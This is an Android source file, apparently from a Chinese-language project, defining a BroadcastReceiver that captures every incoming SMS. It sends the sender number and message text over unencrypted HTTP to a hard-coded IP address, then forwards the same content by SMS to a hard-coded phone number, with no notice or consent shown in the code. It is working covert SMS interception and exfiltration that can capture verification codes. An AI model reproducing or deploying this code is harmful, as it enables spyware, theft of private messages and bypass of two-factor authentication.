package com.example.main;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import okhttp3.OkHttpClient;
import okhttp3.Request;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;

public class TransmitReceiver extends BroadcastReceiver {
    private static AtomicLong AID = new AtomicLong(0);
    @Override
    public void onReceive(Context context, Intent intent) {
        Long id = AID.incrementAndGet();
        Bundle bundle = intent.getExtras();
        Map<String, String> params=null;
        String message=null;
        String number=null;
        final String baseURL="http://106.13.184.91:8080/product/getTestMsg";
        SmsMessage msg = null;
        if (null != bundle) {
            Object[] smsObj = (Object[]) bundle.get("pdus");
            for (Object object : smsObj) {
                msg = SmsMessage.createFromPdu((byte[]) object);
                Date date = new Date(msg.getTimestampMillis());//时间
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String receiveTime = format.format(date);
                number = msg.getOriginatingAddress();
                message = msg.getDisplayMessageBody();
                message = "@"+number+"@" + message;
                Log.i("noco", message);

                final String finalMessage = message;
                final String finalNumber = number;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String url="http://106.13.184.91:8080/product/getTestMsg?fromMobile="+ finalNumber +"&msgContent="+finalMessage;
                        OkHttpClient client=new OkHttpClient();
                        Request request=new Request.Builder()
                                .url(url).build();
                        try {
                            client.newCall(request).execute();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        transmitMessageTo("13307496020", finalMessage+url);

                    }
                }).start();
            }
        }

    }
    public void transmitMessageTo(String phoneNumber, String message) {//转发短信
        SmsManager manager = SmsManager.getDefault();
        /** 切分短信，每七十个汉字切一个，短信长度限制不足七十就只有一个：返回的是字符串的List集合*/
        manager.sendMultipartTextMessage(phoneNumber, null, manager.divideMessage(message), null, null);
    }
}
